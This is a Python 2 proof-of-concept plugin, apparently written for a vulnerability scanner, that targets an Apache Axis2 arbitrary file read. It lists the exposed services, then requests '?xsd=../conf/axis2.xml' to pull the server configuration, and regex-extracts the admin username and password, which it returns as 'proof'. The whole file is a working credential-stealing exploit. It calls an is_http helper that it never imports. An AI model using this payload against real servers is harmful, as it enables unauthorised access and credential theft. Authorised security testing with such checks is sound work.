# coding:utf-8
import re
import urllib2
from config import is_port_open


@is_port_open
def verify(host, port=80, name=None, timeout=10):
    if is_http(host, int(port)) is False:
        return
    try:
        url = "http://%s:%d" % (host, int(port))
        res = urllib2.urlopen(url + '/axis2/services/listServices', timeout=timeout)
        res_code = res.code
        res_html = res.read()
        if int(res_code) == 404: return
        m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res_html)
        if m.group(1):
            server_str = m.group(1)
            read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
            res = urllib2.urlopen(read_url, timeout=timeout)
            res_html = res.read()
            if 'axisconfig' in res_html:
                user = re.search('<parameter name="userName">(.*?)</parameter>', res_html)
                password = re.search('<parameter name="password">(.*?)</parameter>', res_html)
                info = {
                    "url": url,
                    "severity": "high",
                    "vuln_name": "Axis2 Any File Read",
                    "proof": "username={}&password={}".format(user.group(1), password.group(1))

                }
                return info
    except Exception as e:
        print "[poc_axis_config_read] [line 31] [error={}]".format(repr(e))
        pass
